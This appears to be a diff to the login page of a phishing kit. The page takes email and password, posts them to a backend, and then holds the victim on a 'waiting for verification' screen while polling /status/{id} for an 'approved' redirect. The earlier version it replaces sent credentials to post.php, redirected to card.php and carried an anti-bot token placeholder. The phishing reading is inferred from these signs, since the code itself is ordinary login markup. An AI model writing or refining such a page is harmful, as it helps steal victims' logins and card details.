@@ -5,6 +5,64 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login</title>
     <link rel="stylesheet" href="res/app.css">
+    <style>
+        .spinner-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .spinner-container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            text-align: center;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+        }
+        
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .spinner-message {
+            color: #333;
+            font-size: 16px;
+            margin-bottom: 10px;
+        }
+        
+        .spinner-submessage {
+            color: #666;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+        
+        .error {
+            border-color: #ff4444 !important;
+        }
+        
+        button:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+    </style>
 </head>
 <body>    
 
@@ -21,24 +79,17 @@
 
         <div class="col">
             <label>Email</label>
-            <input type="text" id="u">
+            <input type="text" id="u" placeholder="Enter your email">
         </div>
 
         <div class="col">
             <label>Password</label>
-            <input type="password" id="p">
+            <input type="password" id="p" placeholder="Enter your password">
             <a href="#">Forgot password?</a>
         </div>
 
-        <!-- antibot token placeholder -->
-        <script>
-            if (typeof globalThis.token === "undefined") {
-                globalThis.token = "ANTIBOT_TOKEN_PLACEHOLDER";
-            }
-        </script>
-
         <div class="col">
-            <button onclick="sendLogin()">Login</button>
+            <button id="loginBtn" onclick="sendLogin()">Login</button>
         </div>
 
         <div class="col links">
@@ -49,30 +100,119 @@
     </div>
 </main>
 
+<div class="spinner-overlay" id="spinnerOverlay">
+    <div class="spinner-container">
+        <div class="spinner"></div>
+        <div class="spinner-message">Waiting for verification...</div>
+        <div class="spinner-submessage">Please wait while we verify your credentials</div>
+    </div>
+</div>
+
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
 
 <script>
+let sessionId = null;
+let checkInterval = null;
+let timeoutCounter = 300;
+let timeoutInterval = null;
+
+function showSpinner() {
+    $("#spinnerOverlay").css("display", "flex");
+    $("#loginBtn").prop("disabled", true);
+}
+
+function hideSpinner() {
+    $("#spinnerOverlay").css("display", "none");
+    $("#loginBtn").prop("disabled", false);
+    if (timeoutInterval) clearInterval(timeoutInterval);
+}
+
+function updateTimeout() {
+    timeoutCounter--;
+    
+    if (timeoutCounter <= 0) {
+        clearInterval(timeoutInterval);
+        clearInterval(checkInterval);
+        hideSpinner();
+        alert("Request timed out. Please try again.");
+    }
+}
+
+function checkStatus() {
+    if (!sessionId) return;
+    
+    $.ajax({
+        url: `/status/${sessionId}`,
+        method: 'GET',
+        success: function(response) {
+            if (response.status === "approved") {
+                clearInterval(checkInterval);
+                clearInterval(timeoutInterval);
+                hideSpinner();
+                window.location.href = response.redirect_url;
+            }
+        },
+        error: function(xhr) {
+            if (xhr.status === 404) {
+                clearInterval(checkInterval);
+                clearInterval(timeoutInterval);
+                hideSpinner();
+                alert("Session expired. Please try again.");
+            }
+        }
+    });
+}
+
 function sendLogin() {
     $("input").removeClass("error");
 
-    if ($("#u").val() === "") {
+    const username = $("#u").val().trim();
+    const password = $("#p").val().trim();
+
+    if (!username) {
         $("#u").addClass("error");
+        alert("Please enter your email");
         return;
     }
 
-    if ($("#p").val() === "") {
+    if (!password) {
         $("#p").addClass("error");
+        alert("Please enter your password");
         return;
     }
 
-    console.log("REQUEST SENT");
+    showSpinner();
 
-    $.post("post.php", {
-        user: $("#u").val(),
-        pass: $("#p").val()
-    }, function () {
-        window.location = "card.php";
+    if (checkInterval) clearInterval(checkInterval);
+    if (timeoutInterval) clearInterval(timeoutInterval);
+
+    $.ajax({
+        url: '/login',
+        method: 'POST',
+        contentType: 'application/json',
+        data: JSON.stringify({
+            login: username,
+            password: password
+        }),
+        success: function(response) {
+            if (response.success) {
+                sessionId = response.id;
+                
+                timeoutCounter = 300;
+                timeoutInterval = setInterval(updateTimeout, 1000);
+                checkInterval = setInterval(checkStatus, 1500);
+                
+                setTimeout(checkStatus, 500);
+                
+            } else {
+                hideSpinner();
+                alert("Login failed. Please try again.");
+            }
+        },
+        error: function() {
+            hideSpinner();
+            alert("Connection error. Please try again.");
+        }
     });
 }
 
@@ -80,6 +220,11 @@ $("input").keypress(function (e) {
     if (e.key === "Enter") {
         sendLogin();
     }
+});
+
+$(window).on('beforeunload', function() {
+    if (checkInterval) clearInterval(checkInterval);
+    if (timeoutInterval) clearInterval(timeoutInterval);
 });
 </script>
 
